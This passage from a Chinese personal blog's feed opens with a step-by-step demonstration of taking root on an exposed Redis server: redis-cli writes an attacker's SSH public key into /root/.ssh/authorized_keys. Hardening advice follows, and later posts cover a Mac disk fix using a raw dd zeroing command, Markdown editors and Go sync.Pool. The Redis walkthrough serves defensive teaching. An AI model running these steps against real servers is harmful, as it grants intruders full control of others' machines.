<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">root@Atacker:~# apt-get update</div><div class="line">root@Atacker:~# apt-get install redis-tools</div><div class="line">root@Atacker:~# ssh-keygen # 需相应的全默认回车</div><div class="line">root@Atacker:~# (echo -e &quot;\n&quot;;cat .ssh/id_rsa.pub;echo -e &quot;\n&quot;) &gt; pubkey.txt</div><div class="line">root@Atacker:~# cat pubkey.txt | redis-cli -h 172.17.171.122 -x set &quot;pubkey&quot;</div><div class="line">root@Atacker:~# redis-cli -h 172.17.171.122</div><div class="line">172.17.171.122:6379&gt; config set dir /root/.ssh</div><div class="line">172.17.171.122:6379&gt; config set dbfilename &quot;authorized_keys&quot;</div><div class="line">172.17.171.122:6379&gt; save</div><div class="line">172.17.171.122:6379&gt; exit</div><div class="line">root@Atacker:~# ssh root@172.17.171.122</div><div class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-105-generic x86_64)</div><div class="line"></div><div class="line"> * Documentation:  https://help.ubuntu.com</div><div class="line"> * Management:     https://landscape.canonical.com</div><div class="line"> * Support:        https://ubuntu.com/advantage</div><div class="line"></div><div class="line">Welcome to Alibaba Cloud Elastic Compute Service !</div><div class="line"></div><div class="line">Last login: Fri Apr  6 15:33:41 2018 from 172.17.171.123</div><div class="line">root@Target:~#</div></pre></td></tr></table></figure>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@Target:~# cat .ssh/authorized_keys</div><div class="line">REDIS0008�	redis-ver4.0.9�</div><div class="line">redis-bits�@�ctime�H#�Zused-mem��</div><div class="line">                                 �</div><div class="line">                                  aof-preamble���pubkeyA�</div><div class="line"></div><div class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7xaxGi7ZQAMX7YJRiyBDdz1RGIaPiSl+LHk8AfIvBjFja3GTRy+YqYk/DrpG/AKpNW27nW4jxckkFuCxpmkXNCkl80EQfI4r1PqhW2qoTpYwX5EJlRP6W5oytS5qqMnNN9mGP3u3/VT7lakk57NjFusdAV00sxMWz/kvgi3ZBxMhtWizLDR04dY3+2uLPwu/0GK10iw1dBoRCig2AAFAwMUwUrxAfb7D0YkqD2tDYz0N3u9TzzXGXHrZEi/nFaBRIqKZEr5RT5gSQLV5BGQud5DsuMw04bt4rr1cvWSLUbFySyvtZh4EVZsYjsAV0rd+SNQ0vbel0ThbpWbALyFXd root@Atacker</div><div class="line"></div><div class="line"></div><div class="line">a�	��x&quot;����r</div></pre></td></tr></table></figure>
<p>攻击者利用redis，把自己的公钥写到了.ssh/authroized_keys文件内，再使用ssh登陆的时候，便被认为是有权限的登陆者，从而获得了root账户的完全控制权。</p>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>要禁止这些漏洞，要做以下检查</p>
<ol>
<li>不要使用root用户直接建立实例，可以为redis专门设置一个账户，或者用其他无sudo权限的用户开启redis-server，这样即使被攻破，影响也会小一些。</li>
<li>没有特殊需求的话，防火墙不要轻易暴露公网端口，实例不要轻易绑定0.0.0.0，不要轻易使用默认6379端口，不要轻易把protected-mode设为no。</li>
<li>如果连内网安全都无法保证，请设置密码。这是不推荐的策略，因为能够用防火墙防住的，尽量不要用密码防，毕竟密码有理论上的可破解性。</li>
<li>用户的.ssh内的文件都应该权限设置为400，防止被别的用户篡改。</li>
</ol>
<hr>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ol>
<li>以上实例、IP、公钥都是临时申请的，不会再使用，业已删除，请不要乱试。</li>
<li>实例都是基于纯净版debian 9.2 64bit，测试以上内容不需要额外做任何操作。</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在公网暴露端口的无防护Redis实例，很容易成为攻击者直接攻破的跳板，下面讲述一下攻击过程。&lt;br&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Redis" scheme="http://zablog.me/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Mediakit报告设备商的空间不足以执行此操作的纯MAC解法</title>
    <link href="http://zablog.me/2018/03/09/diskutil/"/>
    <id>http://zablog.me/2018/03/09/diskutil/</id>
    <published>2018-03-09T11:06:39.000Z</published>
    <updated>2018-03-12T02:15:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>使用Mac对磁盘进行分区，显示“Mediakit报告设备商的空间不足以执行此操作”，该怎么办？</p>
<a id="more"></a>
<h1 id="What"><a href="#What" class="headerlink" title="What"></a>What</h1><p>买了一个4TB的移动硬盘，准备进行分区给Time Machine用。<br>硬盘自带是HDFS的，所以连上Mac之后，准备使用自带的<code>磁盘工具.app</code>进行格式化。<br>无论是选择 <code>OS X 扩展（日志式）</code>还是选择<code>Apple文件系统</code>，都会报错</p>
<blockquote>
<p>Mediakit 报告设备上空间足以执行此操作</p>
</blockquote>
<p>然而网上的所有中文解决办法，全部都是需要动用大名鼎鼎的<code>DiskGenius</code>磁盘工具。这个工具我以前使用过，确实做的很用心，在PC上使用非常方便。</p>
<p>但是，我临时手头没有任何Windows设备！怎么办？！</p>
<h1 id="How"><a href="#How" class="headerlink" title="How"></a>How</h1><p>开门见山，直接说说怎么解决。</p>
<p>首先打开命令行<br>如果你不知道什么是命令行，可以使用(访达/Finder)，在个人收藏里面打开<code>终端.app</code>。</p>
<p>键入如下内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">diskutil list</div></pre></td></tr></table></figure>
<p>这个时候你会获得你的所有磁盘内容。</p>
<p>找到你刚连上的移动硬盘。如果你实在不知道哪个是你刚连上的，注意哪个地方有<code>external</code>或<code>physical</code> </p>
<p>找到这个磁盘，譬如<code>disk2</code>，就运行下面的命令。如果不是<code>disk2</code>，那么用你的disk替换一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">diskutil unmountDisk force disk2</div></pre></td></tr></table></figure>
<p>然后写入一个纯0的200M启动扇区</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo dd <span class="keyword">if</span>=/dev/zero of=/dev/disk2 bs=1024 count=1024</div></pre></td></tr></table></figure>
<p>最后，再次尝试使用命令行进行分区。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">diskutil partitionDisk disk2 GPT JHFS+ <span class="string">"AWESOME DISK"</span> 0g</div></pre></td></tr></table></figure>
<p>至此，搞定。</p>
<h1 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h1><p>产生错误的原因是对于超过4TB的磁盘来说，一定是使用GUID分区表。在这种情况下，必须需要一个200M的EFI分区，才能够进行分区。</p>
<p>APFS确实比HFS+有更高的优势，譬如COW等等，因此性能更高。<br>APFS甚至支持动态分区。<br>但是APFS不支持时间机器，所以我这个磁盘还是要用HFS+。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用Mac对磁盘进行分区，显示“Mediakit报告设备商的空间不足以执行此操作”，该怎么办？&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>几款MarkDown对比</title>
    <link href="http://zablog.me/2017/12/16/markdown/"/>
    <id>http://zablog.me/2017/12/16/markdown/</id>
    <published>2017-12-16T13:00:00.000Z</published>
    <updated>2017-12-17T02:53:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天来比较三款MarkDown工具。入选的三个工具分别叫做<code>马克飞象</code>、<code>小书匠</code>、<code>作业部落Cmd Markdown</code>。入选的必要条件是支持所有的终端，且可以导到其他的笔记平台。单个端的Markdown解析器、或者文本编辑器的插件之类的，不在今天的讨论之列。</p>
<a id="more"></a>
<p>这几款Markdown工具都是国产，各有优劣。下面将给大家具体分析</p>
<h2 id="笔记平台"><a href="#笔记平台" class="headerlink" title="笔记平台"></a>笔记平台</h2><p>印象笔记等笔记平台不在今天的比较队列里，这里首先来讲述一下使用Markdown的痛点所在。</p>
<p>印象笔记其实在格式方面是存在很多问题的。其实印象笔记这个公司在2016年就在融资上出现了很大的问题，确实它的格式在2006年左右还是杀手级的，但是恐怕这个公司已经对兼容性焦头烂额了。</p>
<p>当然，对于一个程序员来说，对于印象笔记最为头疼的地方是它无法写代码。它比IDE等等差的太多，甚至连vim都不如。当你在里面写了两个英文的双引号，则左边的会自动变成中文的左括号。<em><strong>黑人问号？？？</strong></em>这还怎么写代码？！</p>
<p>Wiz笔记作为国内的笔记旗帜，对于Markdown的支持还是令人很欣慰的。早在五年前，我还是Wiz的忠实用户。但是切换Macbook以后，发现这个软件对于Mac段的支持一直不尽如人意，所以后来还是转了印象笔记，并成为印象笔记的忠实付费高级用户。</p>
<p>而且Wiz笔记现在不付费好像是几乎没法用了，这个也是有点不太好呀。</p>
<p>有道云笔记也使用过，但是没有留下太强烈的印象，后来也放弃了。</p>
<p>对于问题，三款Markdown都能够完好的解决，毕竟Markdown嘛，可以用```来写代码的。</p>
<hr>
<h2 id="马克飞象"><a href="#马克飞象" class="headerlink" title="马克飞象"></a>马克飞象</h2><p>马克飞象对于各个客户端做得相对来说比较<code>native</code>，所以算是支持的比较好的。对于同步笔记来说，它并没有把印象笔记的原有内容同步过来。这一方面说是一个问题，另一方面说也是一个优点。毕竟原来的笔记并不是支持这样一个markdown的格式的，而且那么多笔记，总共也得有1000篇了吧，总体弄过来真的比较乱。</p>
<p>现在的问题是这个内容能不能自动同步。但是从“正在从印象笔记载入”字样来看应该没这个顾虑。</p>
<p>缺陷：</p>
<ul>
<li>价格是肯定要放在缺陷里面的。当然，收费没有任何值得指责的，毕竟作者辛辛苦苦为大家提供了很好的产品。但是如果两个产品一样的话，那么我们还是更喜欢拥抱开源的免费的大家庭。</li>
<li>文章在印象笔记端无法编辑。当然这个也确实解决了冲突的问题，但是笔记端只能看不能写也是有点讨厌。</li>
</ul>
<p>对于Markdown的存储方式，在微博上看到作者本人的回复。印象笔记本身的格式是enml，是html兼容的。作者在整个enml的最后增加了一个<code>&lt;center&gt;</code>标签，并且把这个center标签设置为隐藏的，所以我们在印象笔记中看不到相关的内容，但是它真真切切地同步了。至于图片的话，就直接印象笔记兼容的图片嵌入进去了。马克飞象可以通过相应的操作，把整个Markdown还原回来。</p>
<hr>
<h2 id="小书匠"><a href="#小书匠" class="headerlink" title="小书匠"></a>小书匠</h2><p>不可否认的是，小书匠做得确实不错。</p>
<p>这里就不上图了，因为截了个图发现暴露了一些隐私账户。</p>
<p>居然可以把印象笔记的所有内容都同步过来，并且都尝试以Markdown的方式进行打开。</p>
<p>小书匠免费版的功能是最强大的，收费版的费用也并不贵。20元一年，也就一碗帝都牛肉面而已。</p>
<p>小书匠的缺陷，个人认为也是三个编辑器中最大的。首先是它使用了一个比较奇怪的引擎，导致用起来的流畅度不足。</p>
<p>为了省事儿，很多软件的跨平台，实际上都是js的功劳。启示还是有很多js框架做的不错的，譬如 <a href="https://github.com/electron/electron" target="_blank" rel="noopener">Electron</a>，然而小书匠用的这个是<a href="https://github.com/nwjs/nw.js" target="_blank" rel="noopener">nwjs</a>。感觉上会稍微不那么原生。最基本的，对于一个Mac用户来说，它不支持最大化就罢了，关闭、满窗口（非最大化）、最小化三个按钮居然还在界面右端，非常不习惯。</p>
<p>不过这些并不足以让我放弃一个编辑器，让我最终放弃它的原因是它对<code>Undo</code>的支持非常差。</p>
<p>假若你输入一段中文<code>今日头条</code>，输入完之后，点击<code>⌘</code>+<code>Z</code>进行Undo操作，你会得到一个字符串<code>jin&#39;ri&#39;tou&#39;tiao</code>，然后不停地点击<code>⌘</code>+<code>Z</code>，这堆英文字母才能挨个消失。这是让人无法忍受的。</p>
<p>而如果你先输入了中文<code>今日头条</code>，然后又使用delete键删除了<code>条</code>，这个时候你的界面上剩下<code>今日头</code>，你会发现你的<code>⌘</code>+<code>Z</code>键完全失效了。这种失灵也完全无法忍受。</p>
<p>这种问题很可能是js本身平台的问题，因为我尝试了网页版，也存在同样的问题。</p>
<p>当然，小书匠也有很多优点。一个是界面确实功能丰富，另外一个是它同步导入印象笔记是可编辑的，而且其markdown部分也作为附件存在了笔记下面。这让人看着安心，自己的信息一定不会丢失。</p>
<hr>
<h2 id="Cmd-Markdown"><a href="#Cmd-Markdown" class="headerlink" title="Cmd Markdown"></a>Cmd Markdown</h2><p>最后是Cmd Markdown，这一款笔记做的也非常好。</p>
<p>它支持Tex的公式，还支持流程图、时序图，甚至还支持甘特图。</p>
<p>不过它还是以自身为主，对于笔记平台的依赖性相对比较低。如果想要同步到印象笔记的话，得专门点击设置，然后用导出的方式来导出到笔记，这个是我不太希望的。我期待的结果是直接点击<code>⌘</code>+<code>S</code>就给我乖乖同步到印象笔记，这个功能，前面两款做的都非常好。</p>
<p>更何况，从cmd markdown导出到印象笔记还需要充会员，连试用的机会都没有，￥90/year。</p>
<p>马克飞象和小书匠都支持非常非常丰富的主题列表，而cmd markdown对主题的支持相对来说简陋了一些，只支持亮暗两种。</p>
<p>cmd markdown的展示还是非常方便的，当文档写得好的话，就直接不需要专门做Keynote了。</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些编辑器有一些共同的优点，譬如他们都支持导出，都支持非常程序员喜爱的操作方式，导出方式，保存方式。甚至是把数据仓库都指示了出来。</p>
<p>它们都是全平台的工具，而且都支持加载很快，非常方便的web端，效率比Google Docs高得多。因此，它们都一定程度上解决了印象笔记的痛点，当然，有的时候也会不小心引入新的痛点。</p>
<p>从我的选择上来说，还是选择马克飞象了。</p>
<p>对于效率工具这方面，大家都不要吝惜自己的小钱钱，毕竟这是能够给你带来更大价值的工具。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天来比较三款MarkDown工具。入选的三个工具分别叫做&lt;code&gt;马克飞象&lt;/code&gt;、&lt;code&gt;小书匠&lt;/code&gt;、&lt;code&gt;作业部落Cmd Markdown&lt;/code&gt;。入选的必要条件是支持所有的终端，且可以导到其他的笔记平台。单个端的Markdown解析器、或者文本编辑器的插件之类的，不在今天的讨论之列。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Markdown" scheme="http://zablog.me/tags/Markdown/"/>
    
  </entry>
  
  <entry>
    <title>Go语言小技巧——合理使用Pool</title>
    <link href="http://zablog.me/2017/12/13/go_pool/"/>
    <id>http://zablog.me/2017/12/13/go_pool/</id>
    <published>2017-12-13T13:00:00.000Z</published>
    <updated>2017-12-13T09:29:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>垃圾回收一直是Go语言的一块心病，在它执行垃圾回收的时间中，你很难做什么。<br>在垃圾回收压力大的服务中，GC占据的CPU有可能超过2%，造成的Pause经常超过2ms。垃圾严重的时候，秒级的GC也出现过。<br>如果经常临时使用一些大型结构体，可以用Pool来减少GC。</p>
<a id="more"></a>
<p>示例代码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"sync"</span></div><div class="line">	<span class="string">"time"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">type</span> structR6 <span class="keyword">struct</span> &#123;</div><div class="line">	B1 [<span class="number">100000</span>]<span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> r6Pool = sync.Pool&#123;</div><div class="line">	New: <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">interface</span></span>&#123;&#125; &#123;</div><div class="line">		<span class="keyword">return</span> <span class="built_in">new</span>(structR6)</div><div class="line">	&#125;,</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">usePool</span><span class="params">()</span></span> &#123;</div><div class="line">	startTime := time.Now()</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++ &#123;</div><div class="line">		sr6 := r6Pool.Get().(*structR6)</div><div class="line">		sr6.B1[<span class="number">0</span>] = <span class="number">0</span></div><div class="line">		r6Pool.Put(sr6)</div><div class="line">	&#125;</div><div class="line">	fmt.Println(<span class="string">"pool Used:"</span>, time.Since(startTime))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">standard</span><span class="params">()</span></span> &#123;</div><div class="line">	startTime := time.Now()</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++ &#123;</div><div class="line">		<span class="keyword">var</span> sr6 structR6</div><div class="line">		sr6.B1[<span class="number">0</span>] = <span class="number">0</span></div><div class="line">	&#125;</div><div class="line">	fmt.Println(<span class="string">"standard Used:"</span>, time.Since(startTime))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	standard()</div><div class="line">	usePool()</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>一个含有100000个int值的结构体，在标准方法中，每次均新建，重复10000次，一共需要耗费193ms；<br>如果用完的struct可以废物利用，放回pool中。需要新的结构体的时候，尝试去pool中取，而不是重新生成，重复10000次仅需要693us。<br>这样简单的操作，却节约了99.65%的时间，也节约了各方面的资源。最重要的是它可以有效减少GC CPU和GC Pause。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;垃圾回收一直是Go语言的一块心病，在它执行垃圾回收的时间中，你很难做什么。&lt;br&gt;在垃圾回收压力大的服务中，GC占据的CPU有可能超过2%，造成的Pause经常超过2ms。垃圾严重的时候，秒级的GC也出现过。&lt;br&gt;如果经常临时使用一些大型结构体，可以用Pool来减少GC。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="go" scheme="http://zablog.me/tags/go/"/>
    
  </entry>
  
</feed>
